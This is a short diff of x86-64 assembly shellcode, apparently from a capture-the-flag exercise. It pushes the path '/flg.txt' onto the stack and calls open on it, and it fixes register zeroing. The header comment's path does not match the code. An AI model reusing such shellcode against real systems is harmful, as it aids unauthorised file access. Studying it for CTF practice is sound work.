@@ -3,9 +3,9 @@ global _start
 section .text
 _start:
 	; push './flg.txt\x00'
-	xor al, al
+	xor eax, eax
 	push ax             ; push NULL string terminator
-	mov rdi, 'flag.txt'  ; rest of file name
+	mov rdi, '/flg.txt'  ; rest of file name
 	push rdi             ; push to stack 
 
 	; open('rsp', 'O_RDONLY') (rax: 2)
@@ -38,4 +38,3 @@ _start:
 	;mov al, 60
 	;xor rdi, rdi
 	;syscall
-
